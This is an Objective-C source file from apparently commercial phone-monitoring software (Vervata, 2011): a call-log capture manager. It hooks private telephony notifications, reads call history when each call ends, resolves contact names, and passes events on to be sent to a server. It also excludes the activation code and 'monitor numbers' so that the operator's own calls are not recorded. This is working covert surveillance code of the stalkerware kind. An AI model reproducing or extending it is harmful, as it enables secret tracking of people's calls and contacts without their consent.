/**
 - Project name :  CallLogCapture 
 - Class name   :  CallLogCaptureManager
 - Version      :  1.0  
 - Purpose      :  For Call Log Capturing Component
 - Copy right   :  30/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "CallLogCaptureManager.h"
#import "TelephonyNotificationManagerImpl.h"
#import "CallLogCaptureDAO.h"
#import "CallLog.h"
#import "FxLogger.h"
#import "FxEventEnums.h"
#import "FxCallLogEvent.h"
#import "DateTimeFormat.h"
#import "CTCall.h"
#import "ABContactsManager.h"
#import "TelephoneNumber.h"

#import "CTCall.h"


@interface CallLogCaptureManager (PrivateAPI)
- (void) sendCallLogEvent:(CallLog *) aCallLog;
- (BOOL) isNotOperatorServicesWithTelePhonyNumber:(NSString *) aNumber1 
								   databaseNumber:(NSString *) aNumber2
									callDirection:(FxEventDirection) aDirection;
@end

@implementation CallLogCaptureManager

@synthesize mAC;
@synthesize mNotCaptureNumbers;
@synthesize mCallHistoryMaxRowID;

/**
 - Method name: initWithEventDelegate: initWithEventDelegateinitWithEventDelegate
 - Purpose:This method is used to initialize the SMSCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate),aTelephonyNotificationManager (TelephonyNotificationManager)
 - Return description: No return type
*/

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate andTelephonyNotificationCenter:(id <TelephonyNotificationManager>) aTelephonyNotificationManager {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
		mTelephonyNotificationManager = aTelephonyNotificationManager;
	}
	return self;
}

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the CallLogCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
*/

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mTelephonyNotificationManagerImpl = [[TelephonyNotificationManagerImpl alloc] init];
		[mTelephonyNotificationManagerImpl startListeningToTelephonyNotifications];
		mTelephonyNotificationManager = mTelephonyNotificationManagerImpl;
		mEventDelegate = aEventDelegate;
	}
	return self;
}

/**
 - Method name: startCapture
 - Purpose:This method is used to start Call Log Capturing
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) startCapture {
	if (!mListening) {
		[mTelephonyNotificationManager addNotificationListener:self
												  withSelector:@selector(onCallLogCapture:)
											   forNotification:KCALLSTATUSCHANGENOTIFICATION];
		mListening = TRUE;
		
//		CallLogCaptureDAO *callLogDAO=[[CallLogCaptureDAO alloc]init];
//		[self setMCallHistoryMaxRowID:[callLogDAO maxRowID]];
//		[callLogDAO release];
	}
}

/**
 - Method name: startCapture
 - Purpose:This method is used to stop Call Log Capturing
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) stopCapture {
	[mTelephonyNotificationManager removeListner:self];
	mListening = FALSE;
}

/**
 - Method name: onCallLogCapture
 - Purpose:This method is invoked only when initiate incomming or outgoing call 
 - Argument list and description: aNotification (id)
 - Return description: No return type
*/

- (void) onCallLogCapture:(id) aNotification {
	DLog (@"======= onCallLogCapture =======")
	NSNotification* notification = aNotification;
	NSDictionary* dictionary = [notification userInfo];
	if (dictionary) {
		NSInteger callStatus = [[dictionary objectForKey:@"kCTCallStatus"] intValue];
		if(callStatus==CALL_NOTIFICATION_STATUS_TERMINATED) {
			CTCall* call = (CTCall*) [dictionary objectForKey:@"kCTCall"];
			NSString * telNumber = nil;
			if (call) {
				telNumber = CTCallCopyAddress(nil, call);
				[telNumber autorelease];
			}
			
			CallLog *callLog = nil;
			NSArray *callLogs = [NSArray array];
			
			CallLogCaptureDAO *callLogDAO = [[CallLogCaptureDAO alloc]init];
			
			if ([telNumber length] == 0) {
				// Blocked number (this could fail in conference call with blocked number)
				//callLogs = [callLogDAO selectCallHistory];
				//callLog = [callLogs objectAtIndex:0];
				
				callLog = [callLogDAO selectCallHistoryWithLastRowEqual:@""];
				if (callLog) callLogs = [NSArray arrayWithObject:callLog];
			} else { // Voice mail will come here
				callLog = [callLogDAO selectCallHistoryWithLastRowEqual:telNumber];
				if (callLog) callLogs = [NSArray arrayWithObject:callLog];
			}
			
			// Private number is show as 'Blocked' but its number is null
			DLog (@"telNumber = %@, db.number = %@, NOT capture numbers = %@, direction: %d",
				  telNumber,  [callLog mContactNumber], [self mNotCaptureNumbers], [callLog mCallState]);
			DLog (@"callLog = %@, callLogs = %@", callLog, callLogs);
			
			// Voice mail (AIS Thailand = 90099)
			BOOL isNotOperatorServicesNumber = [self isNotOperatorServicesWithTelePhonyNumber:telNumber
																			   databaseNumber:[callLog mContactNumber]
																				callDirection:[callLog mCallState]];
			BOOL isNotCaptureNumber = FALSE;
				
			// -- check monitor numbers only when it's NO outgoing call
			if ([callLog mCallState] != kEventDirectionOut) {
				
				TelephoneNumber *telNumberCompare = [[[TelephoneNumber alloc] init] autorelease];
				for (NSString *number in [self mNotCaptureNumbers]) {
					isNotCaptureNumber = [telNumberCompare isNumber:telNumber matchWithMonitorNumber:number];
					if (isNotCaptureNumber) {
						break;
					}
				}
			// -- check *#900900900 when it is outgoing call
			} 
			/*else if ([callLog mCallState] == kEventDirectionOut) {
				if ([telNumber isEqualToString:_FULLDEFAULTACTIVATIONCODE_]) {
					isNotCaptureNumber = YES;
				}
			}
			*/			
			/*
			 1. Private number ==> Capture
			 2. Activation code number ==> Not capture
			 3. Voice mail number ==> Not capture
			 4. Number in self.mNotCaptureNumbers ==> Not capture
			 5. Incoming call of monitor number ==> Not capture
			 6. *#900900900 ==> Not capture
			 */
			
			if([callLogs count]							&&
			   ![telNumber isEqualToString:[self mAC]]	&&
			   isNotOperatorServicesNumber				&&
			   !isNotCaptureNumber						) {
				
				if ([telNumber length] == 0) {
					// Private number
					DLog (@"Send call event to server as private number, telNumber = %@", telNumber);
					[callLog setMContactNumber:@"Blocked"];
					[self sendCallLogEvent:callLog];
				} else {
					// Number that is not voice mail number, not activation code number, not in self.mNotCaptureNumbers
					DLog (@"Send call event to server as normal number, telNumber = %@", telNumber);
					[self sendCallLogEvent:callLog];
				}
			}

			[callLogDAO release];
			callLogDAO=nil;
		}
	}
}

/**
 - Method name: isNotOperatorServicesWithTelePhonyNumber:databaseNumber:callDirection:
 - Purpose: This method is  used to check whether the call event is voice mail, operator defined numbers...
				which never insert into call history database
 - Argument list and description: aNumber1 (NSStrinbg *), aNumber2 (NSString *), aDirection of the call
 - Return description: BOOL
*/
 
- (BOOL) isNotOperatorServicesWithTelePhonyNumber:(NSString *) aNumber1 
								   databaseNumber:(NSString *) aNumber2
									callDirection:(FxEventDirection) aDirection {
	DLog (@"aNumber1 = %@, aNumber2 = %@, aDirection = %d", aNumber1, aNumber2, aDirection);
	if (aDirection==kEventDirectionOut) {
	   if (![aNumber1 isEqualToString:aNumber2]) 
		 return NO;
	}
	return YES;
}

/**
 - Method name: sendCallLogEvent
 - Purpose:This method is  used to send Call Log Event
 - Argument list and description: aCallLog (CallLog)
 - Return description: No return type
*/

- (void) sendCallLogEvent:(CallLog *) aCallLog {
	ABContactsManager *contactManager=[[ABContactsManager alloc]init];
	//DLog (@"Contact Name:--->%@",[contactManager searchContactName:[aCallLog mContactNumber]]);
	DLog (@"Contact Name:--->%@",[contactManager searchFirstNameLastName:[aCallLog mContactNumber]]);
	DLog (@"Contact Number:--->%@",[contactManager formatSenderNumber:[aCallLog mContactNumber]]);
	DLog (@"Duration:---->%d",[aCallLog mDuration]);
	DLog (@"Event Direction---->%d",[aCallLog mCallState]);
	//===========================================Create FxCallLog Event===============================================================
	FxCallLogEvent *callEvent=[[FxCallLogEvent alloc] init];
	NSString *formatNumber=[[aCallLog mContactNumber] stringByReplacingOccurrencesOfString:@"-" withString:@""];
	NSString *contactName=@"";
	if ([formatNumber length]>1) {
		//contactName=[contactManager searchContactName:formatNumber];
		contactName=[contactManager searchFirstNameLastName:formatNumber];
	}
	[callEvent setContactName:contactName];
	[callEvent setContactNumber:[contactManager formatSenderNumber:[aCallLog mContactNumber]]];
	[callEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[callEvent setDuration:[aCallLog mDuration]];
	[callEvent setDirection:[aCallLog mCallState]];
	[callEvent setEventType:kEventTypeCallLog];
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:callEvent withObject:self];
	}
	//======================================================Print Result=================================================================
//	NSString *resultString=[NSString stringWithFormat:@"...\nContact Name:%@,ContactNumber:%@,Duraction:%d,Direction:%d,DateTime:%@....\n",
//							 contactName,[aCallLog mContactNumber],[aCallLog mDuration],
//							 [aCallLog mCallState],[DateTimeFormat phoenixDateTime]];
//	FxLog("", "", 1, kFxLogLevelDebug,resultString);
	//==================================================================================================================================
	[contactManager release];
	contactManager=nil;
	[callEvent release];
	callEvent=nil;
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/
- (void) dealloc {
	[self stopCapture];
	[mTelephonyNotificationManagerImpl release];
	mTelephonyNotificationManagerImpl=nil;
	[mAC release];
	[mNotCaptureNumbers release];
	[super dealloc];
}

@end
